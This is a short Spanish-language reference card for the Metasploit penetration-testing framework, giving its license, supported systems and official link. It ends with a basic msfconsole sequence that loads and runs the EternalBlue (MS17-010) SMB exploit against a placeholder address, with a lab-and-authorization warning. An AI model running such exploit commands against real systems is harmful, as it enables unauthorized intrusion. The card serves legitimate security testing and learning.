# Metasploit Framework

**Licencia:** BSD/Apache (dual)

## Descripción
Framework para pruebas de penetración y validación de vulnerabilidades con amplia comunidad y módulos.

## Sistemas operativos compatibles
- Windows
- Linux

## Enlace oficial
- https://www.metasploit.com/

### Ejemplo básico (msfconsole)
> Solo en entornos de laboratorio y con autorización.
```bash
msfconsole
msf6 > search smb_ms17_010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.0.2.10
msf6 > run
```

